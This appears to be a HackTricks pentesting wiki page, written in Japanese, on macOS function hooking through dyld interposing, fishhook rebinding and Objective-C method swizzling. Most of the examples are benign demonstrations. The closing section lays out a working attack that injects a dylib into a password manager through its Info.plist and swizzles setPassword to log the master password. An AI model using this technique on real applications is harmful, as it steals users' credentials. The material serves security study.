# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**`__interpose` (`__DATA___interpose`)** セクション（または **`S_INTERPOSING`** が付いたセクション）を含む **dylib** を作成し、その中に **元の** 関数と **置き換え先** 関数を参照する **関数ポインタ** のタプルを含めます。

次に、**`DYLD_INSERT_LIBRARIES`** を使ってその dylib を **inject** します（interposing はメインアプリの読み込み前に行われる必要があります）。当然ながら、**`DYLD_INSERT_LIBRARIES`** の使用に適用される [**restrictions**](macos-library-injection/index.html#check-restrictions) もここに適用されます。

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable は interposing のデバッグに使え、interpose process を出力します。

また、**interposing は process と loaded libraries の間で発生する**ことに注意してください。shared library cache では動作しません。

### Dynamic Interposing

今では、関数 **`dyld_dynamic_interpose`** を使って動的に function を interpose することも可能です。これにより、**runtime** において **programmatically** 関数を interpose でき、**beginning** からのみ行う必要はありません。

必要なのは、**置き換える function** と **replacement function** の **tuples** を指定することだけです。
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

すでに **プロセス内** で code execution があり、ターゲットを再起動せずに **imported C function** を hook したい場合、非常に一般的な primitive は **symbol rebinding**（**`fishhook`** によって普及）です。

**`__interpose`** セクションを使う代わりに、この technique は Mach-O メタデータ（`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`）を走査し、現在の image が使っている **import slot を上書き** します。これは、**すでに実行中** の process で function を hook したり、**`rebind_symbols_image`** を使って **1つの image だけ** を hook したりするのに非常に有用です。

> [!TIP]
> これは、実際に **import pointer** を通る呼び出しにのみ影響します。ターゲット関数が **同じ image 内で直接呼び出される** 場合、書き換えるべき imported slot は存在しないため、この technique ではその call site は見えません。
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
最近の macOS バージョンでは、多くの rebinding 対象がもはや書き込み可能な **`__DATA`** ページ上にありません。Rebinder は通常、ポインタをパッチする前に一時的に **`__DATA_CONST`** を書き込み可能にする必要があります。さらに、Apple Silicon / **`arm64e`** では、認証済みポインタと **`__AUTH_CONST.__auth_got`** における追加の間接参照を想定する必要があるため、従来の lazy/non-lazy symbol pointer セクションだけをスキャンする rebinder では、いくつかの call site を見逃す可能性があります。

> [!CAUTION]
> **`arm64e`** ABI は、多くの関数ポインタに **Pointer Authentication (PAC)** を使用します。Intel では動作していた無差別なポインタ書き込みは、Apple Silicon では call site を壊す可能性があります。自分で rebinder や inline hooker を作成する場合は、**`<ptrauth.h>`** の **`ptrauth_sign_unauthenticated`** や **`ptrauth_auth_and_resign`** のようなヘルパーを使えるようにし、特に **`arm64e`** ターゲットでテストしてください。

**`__AUTH`**、**`__AUTH_CONST`**、**`__auth_got`** の詳細については、[このページ](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md) を確認してください。

## Method Swizzling

ObjectiveC では、メソッドは次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

必要なのは **object**、**method**、**params** です。メソッドが呼び出されると **`objc_msgSend`** 関数を使って **msg is sent** されます: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

object は **`someObject`**、method は **`@selector(method1p1:p2:)`**、引数は **value1**、**value2** です。

object structure をたどることで、**method の配列** に到達でき、そこに method code への **names** と **pointers** が **located** されています。

> [!CAUTION]
> method と class は名前に基づいてアクセスされるため、この情報は binary に保存されています。したがって、`otool -ov </path/bin>` や [`class-dump </path/bin>`](https://github.com/nygard/class-dump) を使って取得できます

### Accessing the raw methods

次の例のように、name、params の数、address などの method 情報にアクセスできます:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### method_exchangeImplementations を使った Method Swizzling

関数 **`method_exchangeImplementations`** は、**ある関数の実装**の**アドレス**を**別の関数のものに変更**できます。

> [!CAUTION]
> そのため、ある関数が呼ばれると、**実行されるのは別の関数**です。
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> この場合、正規の**method**の**実装コード**が**method**の**名前**を**検証**すると、この swizzling を**検出**して実行を防ぐことができます。
>
> 次の technique にはこの制約はありません。

### Method Swizzling with method_setImplementation

前の形式は少し変です。なぜなら、2つの methods の実装を互いに入れ替えているからです。**`method_setImplementation`** 関数を使うと、ある **method** の **implementation** を別のものに**変更**できます。

あとでそのアドレスを見つけるのがずっと難しくなるので、上書きする前に、元のものの **implementation** のアドレスを**保存**しておくことを忘れないでください。新しい implementation からそれを呼び出すつもりなら特に重要です。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

このページでは、関数を hook するさまざまな方法について説明しました。ただし、いずれも **attack するために process 内で code を実行する** ことが前提でした。

そのために使う最も簡単な technique は、[Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を inject することです。ただし、これは [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) でも可能だと思われます。

しかし、どちらの option も **unprotected** な binary/process に **限定** されています。制限について詳しくは各 technique を確認してください。

ただし、function hooking attack は非常に特定的で、attacker は **process 内部から sensitive information を steal する** ためにこれを行います（そうでなければ、単に process injection attack を行えばよいからです）。そして、その sensitive information は MacPass のような user downloaded Apps に存在する場合があります。

したがって attacker の vector は、vulnerability を見つけるか、application の signature を strip して、application の Info.plist 経由で **`DYLD_INSERT_LIBRARIES`** env variable を inject し、次のようなものを追加することになります:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
そして、その後 **再登録** する:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
そのライブラリに、その情報を exfiltrate するための hooking code を追加する: Passwords, messages...

> [!CAUTION]
> macOS の新しいバージョンでは、アプリケーション binary の **signature を strip** し、かつ以前に実行されていた場合、macOS は **もうその application を実行しません**。

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## 参考文献

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
